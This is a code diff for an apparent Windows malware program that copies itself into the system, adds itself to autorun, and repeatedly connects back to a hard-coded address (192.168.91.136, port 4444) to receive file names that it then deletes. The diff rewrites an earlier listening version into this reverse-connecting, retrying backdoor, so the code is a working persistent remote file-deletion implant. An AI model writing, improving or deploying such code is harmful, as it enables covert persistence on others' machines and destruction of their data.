@@ -56,33 +56,41 @@ void addToAutorun() {
     RegCloseKey(hKey);
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     copyToSystem();
     addToAutorun();
-    
-    WSADATA wsData; // для версий сокетов
 
-    int erStat = WSAStartup(MAKEWORD(2,2), &wsData); // запуск	
-    SOCKET server = socket(AF_INET, SOCK_STREAM, 0); // возвращает дескриптор с номером сокета, под которым он зарегистрирован в ОС
+    WSADATA wsData;
+    WSAStartup(MAKEWORD(2, 2), &wsData);
 
-    sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(4444);    // слушаем на порту 4444
-    addr.sin_addr.s_addr = INADDR_ANY; // принимаем с любого IP
+    const char* SERVER_IP = "192.168.91.136";
+    const int SERVER_PORT = 4444;
 
-    bind(server, (sockaddr*)&addr, sizeof(addr));
+    while (true) {
+        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
 
-    listen(server, 1); // 1 = максимум 1 соединение в очереди
+        sockaddr_in serverAddr;
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port   = htons(SERVER_PORT);
+        inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);
 
-    SOCKET client = accept(server, nullptr, nullptr);
+        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+            closesocket(sock);
+            Sleep(5000);
+            continue;
+        }
 
-    char filename[256] = {0};
-    recv(client, filename, sizeof(filename), 0);
+        char filename[256] = {0};
+        int bytes = recv(sock, filename, sizeof(filename) - 1, 0);
+        if (bytes > 0) {
+            filename[bytes] = '\0';
+            DeleteFileA(filename);
+        }
 
-    DeleteFileA(filename);
+        closesocket(sock);
+        Sleep(5000);
+    }
 
-    closesocket(client);
-    closesocket(server);
     WSACleanup();
     return 0;
 }
